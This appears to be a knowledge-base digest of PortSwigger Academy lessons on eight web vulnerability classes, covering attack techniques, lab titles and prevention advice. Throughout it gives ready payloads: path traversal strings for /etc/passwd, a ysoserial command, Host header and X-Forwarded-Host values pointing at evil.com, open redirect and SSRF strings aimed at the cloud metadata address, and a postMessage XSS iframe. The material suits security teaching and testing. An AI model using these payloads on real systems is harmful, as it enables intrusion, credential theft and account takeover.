# PortSwigger Academy — Path Traversal, Deserialization, Host Header, Info Disclosure, Logic Flaws, DOM, Open Redirect, Race Conditions
> Source: https://portswigger.net/web-security | RAG Knowledge Base | Full detail preserved

---

## Path Traversal (Directory Traversal)
**Source:** https://portswigger.net/web-security/file-path-traversal

### What It Is
Path traversal vulnerabilities enable an attacker to read arbitrary files on the server running an application — application code, data, credentials for back-end systems, and sensitive OS files. In some cases, attackers can write to arbitrary files on the server, allowing full control.

The vulnerability occurs when an application accepts user-supplied input and appends it to a base file path without adequate validation. Example: `<img src="/loadImage?filename=218.png">`. Without defenses, an attacker requests:
```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```
The application reads: `/var/www/images/../../../etc/passwd` which resolves to `/etc/passwd`.

On Windows, both `../` and `..\` are valid:
```
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

### All Bypass Techniques with Exact Payloads

**1. Absolute path from filesystem root (no traversal needed)**
```
filename=/etc/passwd
```

**2. Nested traversal sequences (inner sequences stripped, outer survive)**
```
filename=....//....//....//etc/passwd
filename=....\/....\/....\/etc/passwd
```

**3. URL encoding of `../`**
```
filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
filename=%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**4. Double URL encoding**
```
filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**5. Non-standard encodings**
```
filename=..%c0%af..%c0%af..%c0%afetc/passwd
filename=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

**6. Required base folder included**
```
filename=/var/www/images/../../../etc/passwd
```

**7. Null byte injection (terminate path before required extension)**
```
filename=../../../etc/passwd%00.png
```
Works when the application appends `.png` after user input — null byte terminates string before extension.

### Tools
- Burp Suite (intercept and modify `filename` parameters)
- Burp Intruder with "Fuzzing - path traversal" built-in payload list
- Burp Scanner (automated detection)

### Impact
- Read arbitrary files: `/etc/passwd`, application source code, config files, credentials
- Potential write access for full server compromise
- Access to credentials stored in configuration files

### Lab Titles (Sub-techniques)
- Basic `../../../etc/passwd`
- Absolute path bypass `/etc/passwd`
- Nested sequences `....//`
- URL encoding `%2e%2e%2f`
- Include base directory in payload
- Null byte extension bypass `%00.png`

### Prevention
```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}
```
Validate input against allowlist, then canonicalize path and verify it starts with expected base directory.

---

## Insecure Deserialization
**Source:** https://portswigger.net/web-security/deserialization

### What It Is
Serialization converts complex data structures (objects and fields) into a flat byte stream. Deserialization reverses this. **Insecure deserialization** occurs when user-controllable data is deserialized by a website — enabling attackers to manipulate serialized objects to pass harmful data into the application code. Also known as "object injection."

### Identifying Serialized Data

**PHP serialized format (human-readable):**
```
O:4:"User":2:{s:4:"name";s:6:"carlos";s:10:"isLoggedIn";b:1;}
```
- `O:4:"User"` — object of class "User" with 4-char name
- `2:` — 2 attributes
- `s:4:"name";s:6:"carlos"` — string attribute "name" = "carlos"
- `s:10:"isLoggedIn";b:1` — boolean attribute true

**Java serialized format (binary):**
- Begins with bytes `ac ed` in hex
- Begins with `rO0` in Base64
- Uses `java.io.Serializable` interface
- `readObject()` is the deserialization entry point

### All Exploitation Techniques

#### 1. Modifying Object Attributes
Decode the Base64-encoded cookie, modify the serialized object, re-encode, resubmit. Example: change `b:0` (false) to `b:1` (true) for an `isAdmin` field.

#### 2. Data Type Manipulation (PHP Loose Comparison)
PHP's `==` operator performs loose comparison. `0 == "Example string"` evaluates to `true` in PHP 7.x. Inject integer `0` as password to bypass string comparison checks.

#### 3. Magic Methods
Automatically invoked methods executing attacker-controlled code during deserialization:
- PHP `__wakeup()` — triggered automatically during deserialization
- PHP `__destruct()` — triggered when object is garbage collected
- PHP `__construct()` — triggered on object instantiation
- Java `readObject()` — triggered during deserialization, can execute arbitrary code

#### 4. Arbitrary Object Injection
Deserializers lack type validation — permits instantiation of any serializable class available to the application regardless of expected types.

#### 5. Gadget Chains
String together existing application/library code snippets ("gadgets") to achieve arbitrary command execution. A "kick-off gadget" (e.g., magic method `__wakeup()`) passes attacker data through a sequence of method calls to a dangerous sink (e.g., `exec()`, `eval()`).

**Java Gadget Chain Tools — ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64
```

Key chains:
- `URLDNS` — triggers DNS lookup; detection/OAST; no library dependency
- `JRMPClient` — TCP connection to supplied IP; useful when DNS is blocked
- `CommonsCollections1` through `CommonsCollections7` — require Apache Commons Collections
- Others depend on Spring, Hibernate, etc.

For Java 16+:
```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED \
     -jar ysoserial.jar [chain] '[command]'
```

**PHP Gadget Chain Tools — PHPGGC:**
```bash
phpggc [library/gadget] [command]
```
Generates PHP serialized payloads using gadget chains from popular frameworks (Laravel, Symfony, Monolog, etc.)

#### 6. PHAR Deserialization
PHP Archive (`.phar`) files contain metadata serialized in PHP format. When a `phar://` stream wrapper is used in any filesystem operation (`file_exists()`, `fopen()`, etc.), PHP automatically deserializes the metadata — even if the operation is not `unserialize()`.

Attack steps:
1. Upload a polyglot PHAR file (disguised as permitted file type, e.g., image)
2. Trigger any filesystem operation with `phar://` pointing to uploaded file
3. PHP deserializes malicious metadata, triggering gadget chain

Bypasses restrictions that only block direct `unserialize()` calls.

### Lab Titles (Sub-techniques)
- Modifying serialized objects — change `isAdmin` boolean in PHP cookie
- Modifying serialized data types — PHP loose comparison type confusion (`0 == string`)
- Using application functionality to exploit insecure deserialization — `__destruct()` magic method
- Arbitrary object injection in PHP — inject custom class that executes code in `__destruct()`
- Exploiting Java deserialization with Apache Commons — ysoserial CommonsCollections chain
- Exploiting PHP deserialization with a pre-built gadget chain — PHPGGC tool
- Exploiting Ruby deserialization using a documented gadget chain — Ruby Marshal format
- Developing a custom gadget chain for PHP deserialization — source code analysis + chain building
- Developing a custom gadget chain for Java deserialization
- Using PHAR deserialization to deploy a custom gadget chain — `phar://` wrapper + file upload

### Prevention
- Avoid deserializing user-controllable data entirely if possible
- Implement digital signatures (HMAC) on serialized objects; verify before deserializing
- Create class-specific deserialization methods with strict type enforcement
- Run deserialization in low-privilege environments

---

## HTTP Host Header Attacks
**Source:** https://portswigger.net/web-security/host-header

### What It Is
The HTTP Host header is a mandatory request header (HTTP/1.1+) specifying the domain name the client wants to access. Attacks exploit websites that handle the Host header value in an unsafe way — arising from the flawed assumption that the header is not user controllable.

In virtual hosting and reverse proxy architectures, the Host header routes requests to the correct back-end application. Applications often use Host values to construct absolute URLs in responses (e.g., password reset links), creating a high-impact attack surface.

### How to Find It

**1. Supply an arbitrary domain via the Host header** — use Burp Suite to separate the Host header from the actual connection target. Observe if the injected value appears in responses.

**2. Check for flawed validation logic:**
- Omit port from Host header (only domain validated, port passed through)
- Use subdomains of whitelisted domains: `Host: expected-host.com.attacker.com`

**3. Send ambiguous requests:**
```
# Duplicate Host headers
Host: legitimate.com
Host: evil.com

# Absolute URL in request line
GET https://legitimate.com/ HTTP/1.1
Host: evil.com

# Line wrapping
GET / HTTP/1.1
     Host: evil.com
Host: legitimate.com
```

**4. Inject host override headers:**
```
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

### All Attack Techniques

#### 1. Password Reset Poisoning
Attack steps:
1. Obtain victim's email/username
2. Submit password reset request
3. Intercept in Burp Suite
4. Modify `Host` header to `evil-user.net`
5. Victim receives legitimate email, but reset URL reads: `https://evil-user.net/reset?token=...`
6. When victim clicks link, token delivered to attacker's server
7. Attacker uses token to reset password and take over account

Also try `X-Forwarded-Host: evil-user.net` if Host header itself is validated.

#### 2. Web Cache Poisoning via Host Header
Host header not included in cache key but reflected in cached response → inject malicious Host value that gets cached and served to all subsequent victims.

#### 3. Classic Server-Side Injection via Host Header
Host value passed directly to SQL queries, LDAP queries, or other dangerous sinks:
```
Host: legitimate.com' OR '1'='1
```

#### 4. Authentication Bypass via Host Header
```
Host: localhost
Host: admin.internal
Host: 127.0.0.1
```

#### 5. Virtual Host Brute-Forcing
Enumerate hidden virtual hosts by fuzzing the Host header with wordlists of internal hostnames. Identify different response sizes/status codes indicating valid internal hosts.

#### 6. Routing-Based SSRF via Host Header
In load balancer/reverse proxy architectures, the Host header determines where requests are routed on the internal network:
```
Host: 192.168.0.1
```
Causes front-end infrastructure to forward requests to arbitrary internal systems.

**Malformed request line SSRF:**
```
GET @evil.com/ HTTP/1.1
Host: legitimate.com
```

#### 7. Connection State Attacks
HTTP/1.1 with `Connection: keep-alive` — subsequent requests on same TCP connection may be processed differently. Establish initial legitimate request, then send requests with different Host header on same connection.

### Lab Titles
- Basic password reset poisoning
- Password reset poisoning via middleware (X-Forwarded-Host)
- Password reset poisoning via dangling markup
- Web cache poisoning via ambiguous requests
- Routing-based SSRF (Host header routes to internal IP)
- SSRF via flawed request parsing (`@` in URL path)
- Host header authentication bypass (`Host: localhost` → admin access)

### Prevention
- Use relative URLs instead of absolute URLs wherever possible
- Validate Host header against a strict allowlist of permitted domains
- Disable support for X-Forwarded-Host and similar override headers unless required
- Configure load balancers/CDNs to only route requests with permitted Host values

---

## Information Disclosure
**Source:** https://portswigger.net/web-security/information-disclosure

### What It Is
Information disclosure (information leakage) is when a website unintentionally reveals sensitive information to users — data about other users, sensitive commercial data, or technical details about website infrastructure. Even "seemingly harmless" information can help attackers construct more sophisticated attacks.

### Common Sources

**1. Files for web crawlers:**
- `/robots.txt` — may list hidden directories meant to be excluded from indexing
- `/sitemap.xml` — reveals site structure

**2. Directory listings:**
When `autoindex` is enabled, browsing to a directory without an index file shows the full file listing — revealing backup files, source code, configuration files.

**3. Developer comments in HTML source:**
```html
<!-- TODO: Remove this before production -->
<!-- Database connection: db.internal:5432 -->
<!-- Admin panel at /manage-3f7b2a9 -->
```

**4. Error messages:**
Verbose errors reveal:
- Stack traces with class names, method names, line numbers
- Framework and language versions: `PHP/7.4.3`, `Apache/2.4.41`
- Database error messages revealing table/column names: `ERROR: column "password" of relation "users" does not exist`
- Internal IP addresses and hostnames

**5. Debugging data:**
Debug pages and log endpoints reveal:
- Values of key session variables
- Hostnames and credentials for back-end components
- File and directory names on the server
- Encryption keys used for signing/encryption

**6. Backup files:**
```
index.php~          (tilde suffix — editor backup)
index.php.bak
config.php.old
.DS_Store           (macOS metadata revealing directory structure)
```

**7. Insecure configuration:**
- HTTP TRACE method enabled — reveals how requests are modified by proxies, showing internal headers
- Overly permissive CORS (`Access-Control-Allow-Origin: *`) combined with sensitive endpoints

**8. Version control history:**
Exposed `.git` directories at `/.git/` allow downloading the entire repository:
```bash
git clone https://vulnerable-site.com/.git repo/
# Tools: git-dumper, gitjacker, gitrob
```
Then explore: `git log`, `git diff`, `git show`

### Testing Techniques

**1. Fuzzing:**
Submit unexpected input types to trigger error messages. Use Burp Intruder with wordlists. Apply grep matching for: `error`, `invalid`, `SELECT`, `SQL`, `stack`, `exception`, `traceback`, `ORA-`, `Warning:`.

**2. Burp Scanner:**
Automatically flags: private keys, email addresses, credit card numbers, backup files, directory listings.

**3. Burp Engagement Tools (right-click in Burp):**
- **Search** — regex search across responses for keywords
- **Find comments** — extract all developer comments
- **Discover content** — identify additional directories/files

**4. Engineering error messages:**
Deliberately craft invalid inputs: submit string where integer expected, omit required parameters, send malformed JSON/XML.

### Lab Titles
- Information disclosure in error messages — error message reveals framework version
- Information disclosure on debug page — phpinfo() or equivalent exposed
- Source code disclosure via backup files — `.bak` file reveals source with hardcoded secret
- Authentication bypass via information disclosure — HTTP TRACE reveals internal header added by proxy
- Information disclosure in version control history — `/.git/` exposed, contains deleted credentials

### Impact
- Credential exposure leading to account takeover
- Internal infrastructure mapping for further attacks
- Source code access enabling vulnerability discovery
- API key/secret exposure enabling API abuse

---

## Business Logic Vulnerabilities (Logic Flaws)
**Source:** https://portswigger.net/web-security/logic-flaws

### What It Is
Business logic vulnerabilities are flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior. Also called "application logic vulnerabilities" or "logic flaws." They emerge when developers make assumptions about how users will interact with the application — assumptions that attackers violate. Unlike injection attacks, logic flaws often appear completely valid to automated scanners.

### All Flaw Categories with Examples

#### 1. Excessive Trust in Client-Side Controls
Applications assume users will only interact via the provided web interface. Attackers use Burp Proxy to modify requests after they leave the browser.

Examples:
- Price stored in hidden HTML field → attacker modifies price to $0.01
- Quantity stored in request body → attacker sets quantity to -1 (credit instead of debit)
- Discount percentage calculated client-side → attacker submits arbitrary discount
- Product ID in request → attacker swaps to premium product at free tier price

#### 2. Failing to Handle Unconventional Input
- **Negative numbers:** `amount=-1000` in funds transfer reverses flow of funds
- **Integer overflow:** Extremely large values wrapping around to negative
- **Extreme values beyond UI limits:** UI restricts quantity 1-99, but server accepts 99999 or -1
- **Unexpected data types:** Sending array where string expected, float where integer expected

#### 3. Making Flawed Assumptions About User Behavior

**a) Users won't omit mandatory input:**
Remove parameters entirely from requests. Applications often behave differently when parameters are absent vs. present but empty. May skip validation steps.

**b) Users follow intended sequence — 2FA bypass:**
```
1. Log in with valid credentials (Step 1)
2. Receive 2FA prompt (Step 2)
3. Instead of completing 2FA, directly navigate to /my-account (Step 3 URL)
4. Application may grant access because Step 1 was completed
```

**c) Trusted users won't remain trustworthy:**
Once elevated (e.g., verified merchant, admin), inconsistent enforcement may leave elevated accounts with fewer security checks on subsequent actions.

#### 4. Domain-Specific / E-Commerce Logic Abuse
- Apply same discount code multiple times
- Apply multiple different discount codes when only one is intended
- Minimum order value bypass via negative-price items
- Buy gift cards, apply to order, repeat ("infinite money" pattern)
- Add items to cart until threshold reached, then remove to keep discount

#### 5. Providing an Encryption Oracle
When user-controllable input is encrypted and the encrypted output made available to the user (e.g., in a cookie), the user can use this as an oracle to encrypt arbitrary plaintext for use in other functions using the same encryption scheme.

#### 6. Email Address Parser Discrepancies
Craft email addresses accepted by registration/validation component but interpreted differently by authentication/authorization component.
Example: Register with `attacker@evil.com@legitimate-admin-domain.com` — one parser sees `attacker@evil.com`, another sees `legitimate-admin-domain.com` as the domain, granting admin access.

### Testing Methodology
1. Map all application functionality and workflows
2. Identify every input accepted and every decision made on that input
3. Try to violate every assumption the application appears to make:
   - Change order of steps
   - Omit parameters
   - Submit unexpected data types
   - Submit extreme values (very large, very small, negative, zero)
   - Repeat steps multiple times
4. Probe each workflow stage independently
5. Look for behavioral differences in responses (timing, size, content)

### Lab Titles
- Excessive trust in client-side controls — price modification in POST body
- High-level logic vulnerability — negative quantity manipulation
- Inconsistent security controls — change email to admin domain after registration
- Flawed enforcement of business rules — apply same coupon code multiple times
- Low-level logic flaw — integer overflow in price calculation
- Inconsistent handling of exceptional input — truncated email address gets admin access
- Weak isolation on dual-use endpoint — remove parameter to skip security check
- Insufficient workflow validation — skip payment step, go directly to order confirmation
- Authentication bypass via flawed state machine — drop request mid-login-flow
- Infinite money logic flaw — buy gift cards, apply to order, repeat
- Authentication bypass via encryption oracle — forge encrypted cookie

---

## DOM-Based Vulnerabilities
**Source:** https://portswigger.net/web-security/dom-based

### What It Is
DOM-based vulnerabilities arise when JavaScript takes data from an attacker-controllable **source** and passes it to a dangerous **sink**.

**Source:** A JavaScript property that accepts potentially attacker-controlled data (e.g., `location.search` reads from URL query string).

**Sink:** A potentially dangerous JavaScript function or DOM object (e.g., `eval()`, `document.body.innerHTML`).

### All Common Sources
```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
location.search
location.hash
location.href
document.cookie
document.referrer
window.name
history.pushState / history.replaceState
localStorage
sessionStorage
IndexedDB
Web messages (window.addEventListener('message', ...))
```

### All Vulnerability Types and Their Sinks

| Vulnerability Type | Example Sinks |
|---|---|
| DOM XSS | `document.write()`, `innerHTML`, `outerHTML`, `insertAdjacentHTML()`, `onevent` handlers |
| Open redirection | `window.location`, `location.href`, `location.assign()`, `location.replace()`, `open()` |
| Cookie manipulation | `document.cookie` |
| JavaScript injection | `eval()`, `setTimeout()`, `setInterval()`, `Function()`, `execScript()` |
| Document-domain manipulation | `document.domain` |
| WebSocket-URL poisoning | `WebSocket()` constructor |
| Link manipulation | `element.src`, `element.href`, `element.action` |
| Web message manipulation | `postMessage()` |
| Ajax request-header manipulation | `setRequestHeader()`, `xhr.open()` |
| Local file-path manipulation | `FileReader.readAsText()` |
| Client-side SQL injection | `ExecuteSql()` |
| HTML5-storage manipulation | `sessionStorage.setItem()`, `localStorage.setItem()` |
| Client-side XPath injection | `document.evaluate()` |
| Client-side JSON injection | `JSON.parse()` |
| Denial of service | `RegExp()` (catastrophic backtracking with attacker-controlled regex) |

### Key Sub-Vulnerability: DOM Open Redirection

Vulnerable code pattern:
```javascript
var url = document.location.hash.slice(1);
if (url.startsWith('https:')) {
    location.href = url;  // redirects to attacker URL
}
```

Attack payload:
```
https://www.innocent-website.com/example#https://www.evil-user.net
```

If attacker controls beginning of string:
```
https://www.innocent-website.com/example#javascript:alert(1)
```

### Key Sub-Vulnerability: Web Message Source Manipulation

Vulnerable pattern:
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;  // XSS sink
});
```

Attack via iframe:
```html
<iframe src="https://target.com/page" 
  onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

**Origin verification bypass techniques:**
- `indexOf()` substring check: `e.origin.indexOf('trusted.com') !== -1` bypassed with `http://trusted.com.evil.net`
- `startsWith()` bypass: bypassed with `https://trusted.com.evil.net`
- `endsWith()` bypass: bypassed with `https://evil-trusted.com`

### Finding DOM Vulnerabilities
1. Browser Dev Tools → Console: search for sources (e.g., `location.hash`)
2. Browser Dev Tools → Sources: search all JS files for sink function names
3. Use Burp Suite **DOM Invader** — automated taint tracking in browser
4. Manual code review: trace each source → look for path to any sink
5. Search JS for dangerous patterns: `innerHTML =`, `document.write(`, `eval(`, `location =`, `location.href =`

### Lab Titles
- DOM XSS using web messages — postMessage without origin check → innerHTML XSS
- DOM XSS using web messages and a JavaScript URL
- DOM XSS using web messages and JSON.parse
- DOM-based open redirection — `location.hash` → `location.href` redirect
- DOM-based cookie manipulation
- Exploiting DOM clobbering to enable XSS
- Clobbering DOM attributes to bypass HTML filters

---

## Open Redirect
**Source:** https://portswigger.net/web-security/dom-based/open-redirection

### What It Is
Open redirect vulnerabilities occur when an application redirects users to a URL controlled by the attacker. The initial URL belongs to a trusted domain (passing link preview checks), but the user ends up on an attacker-controlled page.

### How to Find It
Look for redirect/return parameters: `redirect=`, `url=`, `next=`, `return=`, `goto=`, `dest=`, `destination=`, `redir=`, `redirect_uri=`, `continue=`, `forward=`

Check: after login, logout, OAuth flows, password reset.

### Attack Techniques with Payloads

**Basic:**
```
https://vulnerable-site.com/login?redirect=https://evil.com
```

**Protocol variations:**
```
//evil.com
///evil.com
////evil.com
https:evil.com
javascript:alert(1)
```

**Encoding tricks:**
```
%2F%2Fevil.com          (URL encoded //)
%5C%5Cevil.com          (URL encoded \\)
%09evil.com             (tab character)
%0d%0aLocation:%20http://evil.com   (CRLF injection + redirect)
```

**Domain confusion:**
```
https://evil.com#trusted.com
https://trusted.com.evil.com
https://evil.com\trusted.com
https://trusted.com@evil.com
```

**Path confusion:**
```
https://evil.com/https://trusted.com
```

**IPv6 / alternate IP notation:**
```
http://[::1]
http://2130706433/      (decimal 127.0.0.1)
http://0177.0.0.1/      (octal)
http://0x7f000001/      (hex)
```

**Open redirect chained to SSRF:**
```
https://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

**DOM-based payloads (exploiting `location.hash`):**
```
https://target.com/page#https://evil.com
https://target.com/page#javascript:alert(document.cookie)
```

### Vulnerable Sinks (DOM-Based)
`location`, `location.href`, `location.assign()`, `location.replace()`, `open()`, `element.srcdoc`, `XMLHttpRequest.open()`, `jQuery.ajax()`, `$.get()`, `window.navigate()` (IE)

### Impact
- Phishing: Legitimate-looking URL leads to credential harvesting page
- OAuth token theft: Redirect URI manipulation to steal authorization codes
- SSRF escalation: Internal redirect target
- Reflected XSS via `javascript:` protocol

---

## Race Conditions
**Source:** https://portswigger.net/web-security/race-conditions

### What It Is
Race conditions occur when websites process requests concurrently without adequate safeguards. The exploitable time gap is called the **race window**. Every HTTP request transitions the application through intermediate sub-states lasting ~1ms — these hidden sub-states are exploitable.

### All Attack Types

#### 1. Limit Overrun Race Conditions
The race window opens when a server reads a record ("this promo code has been used: false") and closes after it updates the record. Sending multiple simultaneous requests causes all to see the unmodified state.

**Examples:**
- Apply the same discount code multiple times
- Redeem a gift card multiple times
- Rate a product multiple times
- Withdraw funds beyond account balance
- Reuse CAPTCHA solutions
- Bypass rate limits

#### 2. Hidden Multi-Step Sequences (Sub-State Exploitation)
Single requests transition through multiple internal states. The sub-state may have different security properties than the final state.

**MFA bypass:** After valid password but before MFA enforcement activates, there's a sub-state where the user has a valid session without MFA.

**Email verification race (GitLab CVE-2022-4037):** Two simultaneous email change requests — confirmation token from one address remains valid for the other.

#### 3. Multi-Endpoint Race Conditions
Parallel requests to **different** endpoints sharing the same underlying data:
1. Complete checkout, card charged
2. Simultaneously send request to add item to cart (different endpoint)
3. If item addition processed after payment validation but before order finalization, free item added

#### 4. Single-Endpoint Race Conditions
Parallel requests with **different values** to the **same** endpoint causing a collision:

Password reset token collision:
1. Send two simultaneous password reset requests
2. Race condition causes first request's token to be linked to second request's user ID
3. Final email goes to victim but token works for different account

#### 5. Partial Construction Attacks
Exploit insecure intermediate states during multi-step object creation:
- Object created with some fields null/empty
- Between creation steps, partially-constructed object exists in usable state
- Example: User created with null password — simultaneously send empty-string password during creation window

#### 6. Deferred/Time-Sensitive Attacks
Some application processes run in batches (hourly, daily). Conflicting state changes submitted hours apart can create anomalies processed later.

### Detection Methodology

**Phase 1: Predict**
- Identify security-critical endpoints where concurrent requests could cause harm
- Map all endpoints that read and write the same data record
- Look for: promo/discount code endpoints, balance/limit checks, rate limit counters, token validation

**Phase 2: Probe**
- Benchmark normal sequential behavior
- Send parallel requests (2–30 simultaneous)
- Analyze deviations: different status codes, different response content, unexpected second-order effects

**Phase 3: Prove**
- Validate finding by minimizing number of requests required
- Automate exploitation to confirm reproducibility

### Tools and Techniques

**Burp Suite Repeater — Single-Packet Attack (HTTP/2):**

Add requests to tab group → right-click → "Send group in parallel (single-packet attack)"

For HTTP/2: All requests bundled into **a single TCP packet**, ensuring simultaneous arrival. Achieves ~1ms median timing spread (0.3ms standard deviation). 4-10x more effective than HTTP/1 approach.

**Connection warming:** Send an inconsequential request first (e.g., to a static file) to establish TCP connection before race requests.

**Turbo Intruder Extension:**
For complex scenarios requiring Python-based configuration, high volumes (>30 requests), multiple retries, or staggered timing.

### Lab Titles
- Limit overrun race conditions — apply discount code 20x simultaneously
- Multi-endpoint race conditions — add to cart simultaneously with payment confirmation
- Single-endpoint race conditions — parallel password reset requests → token collision
- Exploiting time-sensitive vulnerabilities — timing-based token prediction
- Partial construction race conditions — exploit null state during object creation
- Bypassing rate limits via race conditions

### Prevention
- Make all state changes **atomic** using database transactions with appropriate isolation levels
- Use database-level integrity constraints (UNIQUE constraints) to reject duplicate states
- **Avoid mixing data sources** within a single operation
- Keep session handlers internally consistent by batching updates atomically
- Use `SELECT FOR UPDATE` / row-level locking to prevent concurrent reads
- Implement idempotency keys for critical operations

---

## Summary Table — All 8 Vulnerability Classes

| Vuln Class | Key Payload/Technique | Primary Tool | Top Impact |
|---|---|---|---|
| Path Traversal | `../../../etc/passwd`, `%252e%252e%252f`, `%00.png` | Burp Intruder | Credential/source read |
| Insecure Deserialization | Modified PHP cookie `b:1`, ysoserial CommonsCollections, PHPGGC, `phar://` | ysoserial, PHPGGC, Burp | RCE |
| Host Header Attacks | `Host: evil.com`, `X-Forwarded-Host`, duplicate Host | Burp Proxy | Account takeover, SSRF |
| Information Disclosure | `/.git/`, `.bak` files, fuzzing error messages, dev comments | Burp Engagement Tools | Credential/key leak |
| Logic Flaws | Negative quantity, skip steps, alternate coupons, negative price | Burp Proxy/Repeater | Financial loss, auth bypass |
| DOM-Based | `location.hash` → `location.href`, postMessage no origin check | Burp DOM Invader | XSS, redirect, cookie theft |
| Open Redirect | `redirect=//evil.com`, `@evil.com`, `%2F%2F`, `javascript:` | Manual, Burp | Phishing, OAuth token theft |
| Race Conditions | Parallel requests (Burp single-packet attack) | Burp Repeater, Turbo Intruder | Promo abuse, auth bypass |
